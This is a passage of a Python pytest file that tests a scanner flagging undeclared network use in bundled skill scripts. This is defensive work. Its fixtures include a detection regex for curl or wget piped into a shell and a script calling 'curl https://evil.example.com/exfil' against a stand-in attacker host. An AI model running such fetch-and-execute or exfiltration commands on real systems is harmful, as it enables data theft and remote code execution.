                '#!/bin/bash\nfetch_exec_re="(curl|wget)[^|]*\\|[[:space:]]*(sh|bash)"\n'
                'if [[ "$cmd" =~ $fetch_exec_re ]]; then echo blocked; fi\n'
            )
        },
    )

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) != []


def test_non_python_allowlist_mode_flags_out_of_list_host(tmp_path: pathlib.Path) -> None:
    """Found live by an adversarial review (issue #1079): the non-Python
    heuristic lane originally only fired for network.mode: disabled, so a
    skill declaring network.mode: allowlist with a non-Python script
    calling an undeclared host was silently scored clean -- exactly the
    "silently scores as clean" failure mode the issue itself exists to
    close, just for a different mode. A literal https?:// host referenced
    in a non-Python bundled script's own text is now checked against the
    declared allowlist domains too, tagged kind="heuristic"."""
    skill_dir = _make_skill(tmp_path, scripts={"fetch.sh": "#!/bin/bash\ncurl https://evil.example.com/exfil\n"})

    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["example.com"]}, skill_dir)

    assert len(findings) == 1
    assert findings[0].kind == "heuristic"
    assert "network-mode-vs-non-python-script-content" in findings[0].message
    assert "evil.example.com" in findings[0].message

    # A host that IS in the allowlist must not be flagged.
    allowed = _make_skill(
        tmp_path, name="allowed-skill", scripts={"fetch.sh": "#!/bin/bash\ncurl https://example.com/data\n"}
    )
    assert scanner.find_network_drift({"mode": "allowlist", "domains": ["example.com"]}, allowed) == []


def test_non_script_asset_under_scripts_dir_produces_no_finding(tmp_path: pathlib.Path) -> None:
    """Found live by an adversarial review (issue #1079): a bundled
    non-script asset under scripts/ (an image, in this fixture) with no
    script extension and no shebang line used to be misread as an
    unreadable "script" purely because it failed a UTF-8 decode, and
    flagged as undetermined network-capable usage -- even though it was
    never a script this lane should have looked at in the first place.
    _looks_like_bundled_script's extension-or-shebang gate now excludes it
    entirely, the same way a data/fixture file always should have been."""
    skill_dir = _make_skill(tmp_path)
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir()
    (scripts_dir / "diagram.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"\xff" * 20)

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_looks_like_bundled_script_treats_unopenable_file_as_not_a_script(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """_looks_like_bundled_script's own OSError fallback (an extensionless
    file that cannot even be opened to peek at a shebang -- a permission
    error or a race where the file disappears mid-scan): treated as "not a
    script" rather than raising, mirroring _bundled_script_trees' own
    OSError handling elsewhere in this module. Exercised via monkeypatch
    rather than a real permission-denied file, since this suite may run as
    root (permission checks would not actually fail in that case)."""
    skill_dir = _make_skill(tmp_path)
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir()
    (scripts_dir / "mystery").write_bytes(b"not actually a script")

    def _raise_os_error(self: pathlib.Path, mode: str = "r") -> None:
        raise OSError("simulated unopenable file")

    monkeypatch.setattr(pathlib.Path, "open", _raise_os_error)

    assert scanner._looks_like_bundled_script(scripts_dir / "mystery") is False


def test_unreadable_script_suppresses_unrestricted_over_declared_warning(tmp_path: pathlib.Path) -> None:
    """Found live by an adversarial review (issue #1079): an unreadable
    non-Python script used to produce BOTH the new
    "non-python-script-unreadable" error (content genuinely unknown) AND
    the pre-existing "over-declared" warning (no network usage shown) in
    the same scan under network.mode: unrestricted -- two findings that
    directly contradict each other, since the script's real content is
    undetermined, not verified-clean. The over-declaration warning is now
    suppressed whenever any script (Python or non-Python) could not be
    read/parsed at all."""
    skill_dir = _make_skill(tmp_path)
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir()
    (scripts_dir / "mystery.sh").write_bytes(b"#!\xff\xfe not valid utf-8\n")

    findings = scanner.find_network_drift({"mode": "unrestricted"}, skill_dir)

    assert len(findings) == 1
    assert "non-python-script-unreadable" in findings[0].message
    assert not any("over-declared" in f.message for f in findings)


# ---- real-repository smoke test ----


def test_real_repository_scan_runs_without_raising() -> None:
    """Deliberately NOT asserting == [] -- see module docstring: issue
    #1022's own Non-goals excludes the retroactive sweep that would be
    needed to make the real repository clean under this scanner today.
    This test only proves find_drift() executes end-to-end against the
    real tree without an unhandled exception."""
    findings = scanner.find_drift()
    assert isinstance(findings, list)
    assert all(isinstance(f, scanner.Finding) for f in findings)
    # A skill-discovery-floor finding means discovery itself failed, in
    # which case every assertion above passes vacuously without the scan
    # having read a single real skill -- found by an independent review.
    assert not any("skill-discovery-floor" in f.message for f in findings)
